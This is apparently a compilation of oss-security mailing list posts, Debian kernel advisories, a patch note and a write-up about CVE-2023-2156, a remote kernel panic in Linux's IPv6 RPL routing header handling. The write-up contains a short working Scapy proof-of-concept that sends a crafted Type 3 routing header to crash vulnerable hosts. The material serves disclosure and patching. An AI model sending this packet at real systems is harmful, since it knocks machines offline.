It also mentions that "the bug patch didn't solve the underlying problem
(ZDI confirmed this too), so we're still expecting another patch at
some[ ]point."

The Zero Day Initiative (ZDI) entry[0] linked from the article[1]
gives a time line:

01/26/22 â€“ ZDI reported the vulnerability to the vendor.
[...]
04/14/23 â€“ The vendor informed the ZDI that a new patch would merge
           into the latest mainline on 04/21/2023.
04/21/23 â€“ The original finder reports to the vendor that the patch
           may not work, and it was confirmed by the ZDI that the
           vulnerability is reproducible on the latest mainline.
05/02/23 â€“ The ZDI informed the vendor that the case will be published
           as a zero-day advisory on 05/04/23, and in coordination with
           Red Hat this vulnerability will be assigned CVE-2023-2156.

[0] <https://www.zerodayinitiative.com/advisories/ZDI-23-547/>
[1] <https://www.interruptlabs.co.uk/articles/linux-ipv6-route-of-death>

The problem described pertains to handling of IPv6 "RPL Source Routing"
using an IPv6 "Extension Header" of the "Routing Header" variant,
the "RPL Source Route Header" (SRH, Routing Type 3).  This header
is described in RFC 6554.  The RFC specifies that RPL border routers
"do not allow datagrams already carrying an SRH header to enter or exit
a[n] RPL routing domain."

The informational RFC 9288 recommends that "IPv6 packets with IPv6
Extension Headers (or options) that are not expected to traverse transit
routers should be dropped."  This is provided as general advice, not
specific to RPL.

Of course, filtering at the border does not protect against compromised
RPL nodes.

Only systems with enabled RPL functionality seem to be vulnerable (as
far as I understand the report).

The described bug pertains to processing the SRH header at the penultimate
hop.

The described result of exploiting the vulnerability is a kernel panic,
i.e., a remote DoS.

HTH,
Erik

    may lead to an out-of-bounds write vulnerability, resulting in
    denial of service or potentially the execution of arbitrary code.

CVE-2023-3212

    Yang Lan that missing validation in the GFS2 filesystem could result
    in denial of service via a NULL pointer dereference when mounting a
    malformed GFS2 filesystem.

CVE-2023-3268

    It was discovered that an out-of-bounds memory access in relayfs
    could result in denial of service or an information leak.

CVE-2023-3269

    Ruihan Li discovered that incorrect lock handling for accessing and
    updating virtual memory areas (VMAs) may result in privilege
    escalation.

CVE-2023-3390

    A use-after-free flaw in the netfilter subsystem caused by incorrect
    error path handling may result in denial of service or privilege
    escalation.

CVE-2023-31084

    It was discovered that the DVB Core driver does not properly handle
    locking of certain events, allowing a local user to cause a denial
    of service.

CVE-2023-32250 / CVE-2023-32254

    Quentin Minster discovered two race conditions in KSMBD, a kernel
    server which implements the SMB3 protocol, which could result in
    denial of service or potentially the execution of arbitrary code.

CVE-2023-35788

    Hangyu Hua discovered an out-of-bounds write vulnerability in the
    Flower classifier which may result in denial of service or the
    execution of arbitrary code.

Subject: Re: IPv6 and Route of Death

I think debian stable/bullseye may not be vulnerable with standard kernel:

The exploit write up suggests it requires the ipv6_rpl_srh_compress()
routine to be compiled in
but from my reading of the code (see
<https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/tree/include/net/rpl.h>)
requires CONFIG_IPV6_RPL_LWTUNNEL to be define which isn't in my
latest debian amd64 kernel:

% grep CONFIG_IPV6_RPL_LWTUNNEL /boot/config-5.10.0-23-amd64
# CONFIG_IPV6_RPL_LWTUNNEL is not set

uname -a
Linux fast 5.10.0-23-amd64 #1 SMP Debian 5.10.179-1 (2023-05-12)
x86_64 GNU/Linux

Package        : linux-5.10
Version        : 5.10.179-3~deb10u1
CVE ID         : CVE-2023-2156 CVE-2023-3390 CVE-2023-3610 CVE-2023-20593
                 CVE-2023-31248 CVE-2023-35001

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2023-2156

    It was discovered that a flaw in the handling of the RPL protocol
    may allow an unauthenticated remote attacker to cause a denial of
    service if RPL is enabled (not by default in Debian).

CVE-2023-3390

    A use-after-free flaw in the netfilter subsystem caused by
    incorrect error path handling may result in denial of service or
    privilege escalation.

CVE-2023-3610

    A use-after-free flaw in the netfilter subsystem caused by
    incorrect refcount handling on the table and chain destroy path
    may result in denial of service or privilege escalation.

CVE-2023-20593

    Tavis Ormandy discovered that under specific microarchitectural
    circumstances, a vector register in AMD "Zen 2" CPUs may not be
    written to 0 correctly.  This flaw allows an attacker to leak
    sensitive information across concurrent processes, hyper threads
    and virtualized guests.

    For details please refer to
    <<https://lock.cmpxchg8b.com/zenbleed.html>> and
    <<https://github.com/google/security-research/security/advisories/GHSA-v6wh-rxpg-cmm8>>.

    This issue can also be mitigated by a microcode update through the
    amd64-microcode package or a system firmware (BIOS/UEFI) update.
    However, the initial microcode release by AMD only provides

Subject: [[PATCHv2 net] net: rpl: fix rpl header size calculation](#r)
Date: Mon, 17 Apr 2023 09:00:52 -0400	[[thread overview]](#r)
Message-ID: <20230417130052.2316819-1-aahringo@redhat.com> (<raw>)

This patch fixes a missing 8 byte for the header size calculation. The
ipv6_rpl_srh_size() is used to check a skb_pull() on skb->data which
points to skb_transport_header(). Currently we only check on the
calculated addresses fields using CmprI and CmprE fields, see:

<https://www.rfc-editor.org/rfc/rfc6554#section-3>

there is however a missing 8 byte inside the calculation which stands
for the fields before the addresses field. Those 8 bytes are represented
by sizeof(struct ipv6_rpl_sr_hdr) expression.

Fixes: 8610c7c6e3bd ("net: ipv6: add support for rpl sr exthdr")

Package        : linux
CVE ID         : CVE-2023-2156 CVE-2023-31248 CVE-2023-35001

Several vulnerabilities have been discovered in the Linux kernel that
may lead to a privilege escalation, denial of service or information
leaks.

CVE-2023-2156

    It was discovered that a flaw in the handling of the RPL protocol
    may allow an unauthenticated remote attacker to cause a denial of
    service if RPL is enabled (not by default in Debian).

CVE-2023-31248

    Mingi Cho discovered a use-after-free flaw in the Netfilter
    nf_tables implementation when using nft_chain_lookup_byid, which may
    result in local privilege escalation for a user with the
    CAP_NET_ADMIN capability in any user or network namespace.

CVE-2023-35001

    Tanguy DUBROCA discovered an out-of-bounds reads and write flaw in
    the Netfilter nf_tables implementation when processing an
    nft_byteorder expression, which may result in local privilege
    escalation for a user with the CAP_NET_ADMIN capability in any user
    or network namespace.

For the oldstable distribution (bullseye), these problems have been fixed
in version 5.10.179-2.

We recommend that you upgrade your linux packages.

net: rpl: fix rpl header size calculation

```
This patch fixes a missing 8 byte for the header size calculation. The
ipv6_rpl_srh_size() is used to check a skb_pull() on skb->data which
points to skb_transport_header(). Currently we only check on the
calculated addresses fields using CmprI and CmprE fields, see:

<https://www.rfc-editor.org/rfc/rfc6554#section-3>

there is however a missing 8 byte inside the calculation which stands
for the fields before the addresses field. Those 8 bytes are represented
by sizeof(struct ipv6_rpl_sr_hdr) expression.

A couple of days late, but since I wanted to read it myself, here's the
text content (as rendered by edbrowse, which looks good enough to me,
look for 'h3' to jump to next sections e.g. 'h3 The Bug'):
--------------
h3 Introduction

Sometimes I feel like exploring random areas of code.
It's a pretty good way to find a new bug pattern.
Early last year I was doing just that, prodding around the Linux Kernel source,
and came across something neat.

h3 Something Neat

The linux kernel handles network data in a structure called an sk_buff (Socket
Buffer). The structure contains a LOT of information,
but the important members are these:

* Head - A pointer to a block of memory containing the packet data
* Data - A pointer to the start of the data to be parsed (There could be
padding before the data, or already-parsed data)
* Tail - An offset to the end of the packet data in the region
* End - An offset to the end of the allocated block of memory
* Len - The distance between the Data pointer and the tail offset

It looks a little like this:

The SKB structure (although the members are reordered to make it clearer)

In order to interract with this data structure, a number of functions are used,
including:

* skb_push (Adds data to the start of the buffer by subtracting from the data
pointer)
* skb_pull (Removes data from the start of the buffer by adding to the data
pointer)

skb_push has a bit of code that prevents it from going outside the bounds of
the allocated buffer:

void *skb_push(struct sk_buff *skb, unsigned int len) {
	skb->data -= len;
	skb->len  += len;
  if (unlikely(skb->data < skb->head))
  	skb_under_panic(skb, len, __builtin_return_address(0));
  return skb->data;
}

If the amount of space we're adding to the start of the buffer is more than we
have allocated, then it'll cause a kernel panic instead of continuing
execution.
This means that any vulnerabilities that would ordinarily cause out-of-bounds
behaviour (the good stuff) are now reduced to denial-of-service bugs.

While a denial-of-service bug may seem boring,
the "remote" aspect usually associated with sk_buffs make them still pretty
interesting. A remote kernel panic is still pretty fun!

I found an instance of this issue type in the IPv6 code for handling Routing
headers. More specifically, the Routing Protocol for Low-Power and Lossy
Networks (RPL Source Routing - RFCs 6550 to 6554).

h3 Routing and RPL

Network protocols are stupidly complex. Ever looked at the RFC for TCP?
Absolutely disgusting.
Fortunately for terrible people such as myself,
complexity paves the road for bugs.

IPv6 has the concept of optional Extension Headers which contain information
about the packet, how it's configured, and where it needs to go to.
One category of header is the Routing header which allows packets to list a
series of IPv6 devices the packet should pass through.
The base structure of the Routing header is as so:

The Routing Header layout from RFC 8200

As shown above, there is a Routing Type member.
This affects the format of the type-specific data.
A number of Routing Types are usable:

* 0 - A deprecated type (Deprecated due to it allowing denial-of-services)
* 1 - Another deprecated type used for Nimrod routing (RFC 1992)
* 2 - Used for Mobile IPv6
* 3 - Used for RPL Source Routing
* 4 - Used for Segment Routing

Since the vulnerability itself resides in the implementation of RPL,
Type 3 is what's important here.
The full RPL header is structured as so:

The RPL Header Structure from RFC 6554

RPL Source Routing also allows for the compression of addresses (RFC 6554)
using the CmprI and CmprE parameters.
These values say how many octets of the destination address are the same as all
the addresses in the vector (and can thus be ommitted for each address in the
vector).

The reason for this is that it's likely that RPL will be used in local networks
where the most significant octets of all the addresses will be the same (which
would be quite wasteful to transport).
The CmprI value says how many octets to omit for all the addresses except the
last address in the vector, and the CmprE value says how many octets to omit
for the final address in the vector.

When the packet arrives at the next node,
it needs to decompress the addresses for several reasons:

* It needs to verify that there are no loops in the list of addresses
* It needs to update the destination address of the IPv6 packet to the next
address in the list and then recompress the vector based on this new
destination address

The process for receiving an RPL packet is therefore:

1. Decompress all the addresses in the vector by attaching the CmprI/CmprE
least significant octets from the addresses in the vector,
to the most significant octets of the destination address
2. Check for loops in the addresses vector
3. Swap the destination address of the packet with Addresses[n -
segments_left - 1] (where n is the number of addresses in the vector,
as shown above)
4. Recompress the addresses in the vector against the new destination address
5. Forward the packet on

h3 The Bug

Because of the way this standard works,
it's possible to cause an amplification attack in the case where segments_left
is 1:
If I have a CmprI value of 15 (So each address in the vector will only contain
a single byte), but have a CmprE value of 0 (so the final address in the vector
contains the full 16 bytes), then when the final address in the vector becomes
the destination address (as would happen when segments_left == 1),
it may not be possible to recompress all the addresses.

This means that an addresses vector that is 48 bytes long (32x1-byte addresses
and 1x16-byte address) the addresses vector recompresses to 528 before being
forwarded onto the next machine.

Interestingly, this expansion is where the underlying bug in the code is.

In the Linux Kernel, the function that performs RPL and calls the
decompression/compression routines is ipv6_rpl_srh_rcv.
When it comes to decompressing the addresses vector,
a buffer is allocated for it:

buf = kcalloc(struct_size(hdr, segments.addr, n + 2), 2, GFP_ATOMIC);

/* ... */

ipv6_rpl_srh_decompress(ohdr, hdr, &ipv6_hdr(skb)->daddr, n);

The destination address is then swapped with the next one (and the original
destination address is stored in-place in the addresses vector):

swap(ipv6_hdr(skb)->daddr, ohdr->rpl_segaddr[i]);

Following this, the addresses vector is then re-compressed against the new
destination address:

ipv6_rpl_srh_compress(chdr, ohdr, &ipv6_hdr(skb)->daddr, n);

The SKB is then re-used for the forwarding by copying the re-compressed data
into it, as well as resetting and rebuilding the headers:

oldhdr = ipv6_hdr(skb);
skb_pull(skb, ((hdr->hdrlen + 1) << 3));
skb_postpull_rcsum(skb, oldhdr, sizeof(struct ipv6hdr) + ((hdr->hdrlen + 1) << 3));
skb_push(skb, ((chdr->hdrlen + 1) << 3) + sizeof(struct ipv6hdr));
skb_reset_network_header(skb);
skb_mac_header_rebuild(skb);
skb_set_transport_header(skb, sizeof(struct ipv6hdr));
memmove(ipv6_hdr(skb), oldhdr, sizeof(struct ipv6hdr));
memcpy(skb_transport_header(skb), chdr, (chdr->hdrlen + 1) << 3);

The big problem here is the call to skb_push,
which tries to add space to the head of the skb for the addresses vector.
In the example mentioned earlier, we changed 48 bytes into 528.
If there are not 528 bytes to spare in the head of the SKB,
then it will cause the data pointer to be below the head pointer and cause a
kernel panic.

h3 Proof-of-Concept

It's possible to trigger this on a machine with RPL enabled (sysctl -a |
grep -i rpl_seg_enabled) with the following code:

# We'll use Scapy to craft the packet
from scapy.all import *
import socket

# Use the IPv6 from your LAN interface
DST_ADDR = sys.argv[1]
SRC_ADDR = DST_ADDR

# We use sockets to send the packet since sending with scapy wasn't working (And I'm far too lazy to debug things)
sockfd = socket.socket(socket.AF_INET6, socket.SOCK_RAW, socket.IPPROTO_RAW)

# Craft the packet
#   Type = 3 makes this an RPL packet
#   Addresses contains 3 addresses, but because CmprI is 15, each octet of the first two addresses is treated as a compressed address (So technically there are 16 compressed addresses)
#   Segleft = 1 to trigger the amplification
#   lastentry = 0xf0 sets CmprI to 15 and CmprE to 0
p = IPv6(src=SRC_ADDR, dst=DST_ADDR) / IPv6ExtHdrSegmentRouting(type=3, addresses=["a8::", "a7::", "a6::"], segleft=1, lastentry=0xf0)

# Send this evil packet
sockfd.sendto(bytes(p), (DST_ADDR, 0))

This causes the a lovely little kernel panic:

h3 Report

I reported this bug through the Zero Day Initiative{ZDI-23-547}.
It was assigned CVE-2023-2156 but the bug patch didn't solve the underlying
problem (ZDI confirmed this too), so we're still expecting another patch at
somepoint. However, it has now been released as an 0day.
Massive props to ZDI for relentlessly chasing up the fix over the past year.

The "original writeup" you reference says this is CVE-2023-2156.

Thank you for bringing this to oss-security.

I'd appreciate it if you and/or others also post plain text extracts of
such content, not only the links.  Anyone willing to do it this time?

Also, this list isn't only about Linux, so when posting about
Linux-specific issues let's state so in the Subject line.  In this case,
the issue is in Linux kernel and it affects systems with enabled sysctl
net.ipv6.conf.*.rpl_seg_enabled for at least some interface(s).
